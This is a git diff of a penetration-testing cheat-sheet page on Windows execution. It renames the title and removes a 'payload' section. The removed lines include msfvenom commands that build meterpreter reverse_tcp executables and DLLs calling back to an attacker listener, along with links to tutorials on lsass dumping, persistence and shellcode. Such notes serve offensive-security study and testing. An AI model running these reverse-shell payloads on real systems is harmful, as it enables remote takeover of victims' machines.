@@ -1,6 +1,6 @@
 ---
 layout: post
-title: TA0002 Execution
+title: / pen / win / exec
 category: pen
 parent: cheatsheets
 modified_date: 2023-07-16
@@ -24,27 +24,6 @@ permalink: /pen/win/exec
 	autoSave=true
 	/vscode-markdown-toc-config -->
 <!-- /vscode-markdown-toc -->
-
-## <a name='payload'></a>payload
-### <a name='pbuild'></a>pbuild
-pbuild = payload build
-```sh
-#? generate msfvenom payloads
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f exe > /tmp/meter-rtcp-192.168.156.1-80.exe
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f dll > /tmp/meter-rtcp-192.168.156.1-80.dll
-```
-
-### <a name='psign'></a>psign
-psign = payload sign
-
-### <a name='sources'></a>sources
-
-*[cocomelonc/registry-run-keys](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html)
-*[cocomelonc/dump-lsass](https://cocomelonc.github.io/malware/2023/05/11/malware-tricks-28.html)
-*[cocomelonc/run-shellcode-via-settimer](https://cocomelonc.github.io/malware/2023/06/04/malware-tricks-31.html)
-*[ired.team/write-shellcode-c](https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c)
-*[codeproject/write-shellcode-c++](https://www.codeproject.com/Articles/5304605/Creating-Shellcode-from-any-Code-Using-Visual-Stud)
-*[byt3bl33d3r/OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim)
 
 ## <a name='dl'></a>dl
 dl = download
